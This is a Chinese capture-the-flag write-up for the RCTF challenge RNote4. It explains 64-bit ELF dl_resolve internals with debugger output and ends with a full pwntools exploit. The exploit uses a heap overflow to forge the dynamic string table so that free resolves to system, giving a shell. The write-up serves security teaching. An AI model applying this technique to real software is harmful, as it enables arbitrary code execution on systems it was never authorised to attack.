# RCTF RNote4
## Author: Wenhuo
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>checksec一下，NO RELRD，NO PIE，利用dll_resolve来getshell很简单。如果没有学过如何利用dll_resolve的可以配合这两篇文章先学习一下：[看雪](https://bbs.pediy.com/thread-227034.htm)，[BruceFan](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>但鉴于这两篇文章都是讲32位下的，我这里再补充一下64位下的不同的地方：</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>Elf64_Sym结构和Elf64_Rel结构如下：</font></br>

```C
typedef struct{
Elf64_Word st_name;
unsigned char st_info;
unsigned char st_other;
Elf64_Section st_shndx;
Elf64_Addr st_value;
Elf64_Xword st_size;
}Elf64_Sym;

typedef struct{
Elf64_Addr r_offset;
Elf64_Xword r_info
}Elf64_Rel;


//elf.h
typedef uint32_t Elf64_Word;
typedef uint64_t Elf64_Xword;
typedef uint16_t Elf64_Section;
typedef uint64_t Elf64_Addr;

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>根据elf.h的定义，64位下的Elf64_Sym大小应该是0x18,Elf64_Rel大小是0x10，还有一个比较坑的地方就是我用readelf -S看节区的时候是这样的：</font></br>

```C
 [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align

[ 5] .dynsym           DYNSYM           00000000004002c0  000002c0
       0000000000000138  0000000000000018   A       6     1     8

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这个.dynsym好像还有一个EntSize，所以在算Elf64_Sym指针的时候还要加一个0x18，不然算不对。接下来我还是手动演示一遍如何以dl_resolve的角度得到free字符串的地址吧。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>首先用readelf -r RNote4得到以下信息：</font></br>

```C
Wenhuo@Wenhuo:~/Desktop$ readelf -r RNote4

Relocation section '.rela.dyn' at offset 0x4d0 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000601ff8  000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000602080  000c00000005 R_X86_64_COPY     0000000000602080 stdin@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x500 contains 10 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000602018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
000000602020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
000000602028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
000000602030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
000000602038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000602040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
000000602048  000700000007 R_X86_64_JUMP_SLO 0000000000000000 calloc@GLIBC_2.2.5 + 0
000000602050  000900000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
000000602058  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 atoi@GLIBC_2.2.5 + 0
000000602060  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>然后直接x/10xg 0x602018来到rel指针处：</font></br>

```C
pwndbg> x/10xg 0x602018
0x602018:	0x0000000000400626	0x0000000000400636
0x602028:	0x00007ffff7b7f970	0x0000000000400656
0x602038:	0x0000000000400666	0x00007ffff7a2d740
0x602048:	0x0000000000400686	0x00007ffff7a7ce70
0x602058:	0x00000000004006a6	0x00000000004006b6

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>第一项的0x400626就是rel指针了，然后x/g 0x400626得到free的Elf64_Rel的结构信息：</font></br>

```C
pwndbg> x/g 0x400626
0x400626 <free@plt+6>:	0xffe0e90000000068

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>r_info>>8就是0了，然后从.dynsym处得到'free\0'的偏移地址，别忘了还有一个0x18:</font></br>

```C
pwndbg> x/g 0x4002c0+0x18
0x4002d8:	0x000000120000005f
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>再从.dynstr里用0x5f这个偏移就可以得到free函数名称字符串了，然后系统就会在动态链接库里根据这个字符串找到地址写入GOT表，我们在这题里就是要想办法让程序找free的时候欺骗它让它把system函数地址放到free里去，然后就可以getshell:</font></br>

```C
pwndbg> x/s 0x4003f8+0x5f
0x400457:	"free"

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>所以我们首先用readelf -d RNote4和x/20xg 0x601e28(.dynmic的地址)找到.dynstr的地址，然后先把.dynstr的地址修改为我们自己的地址，然后伪造一个字符串表，写上'system\0'，然后就可以欺骗了，最终利用脚本如下：</font></br>

Exploit脚本
========

```python
from pwn import *

DEBUG = 1

if DEBUG == 1:
  s=process('./RNote4')
  context(log_level='debug')
  gdb.attach(s)
else:
  s = remote('rnote4.2018.teamrois.cn',6767)

def alloc(size,data):
        s.send(p8(1))
        s.send(p8(size))
        s.send(data)

def edit(idx,size,data):
        s.send(p8(2))
        s.send(p8(idx))
        s.send(p8(size))
        s.send(data)

def free(idx):
        s.send(p8(3))
        s.send(p8(idx))

alloc(0x98,'A' * 0x98)
alloc(0x98,'A' * 0x98)
edit(0,0xb0,'B' * 0x98 + p64(0x21) + p64(0x98) + p64(0x601eb0))
edit(1,0x8,p64(0x602200))

edit(0,0xb0,'B' * 0x98 + p64(0x21) + p64(0x98) + p64(0x602200))
payload = 'A' * 0x5f + 'system\x00'
edit(1,len(payload),payload)

edit(0,0x8,'/bin/sh\x00')
free(0)

```
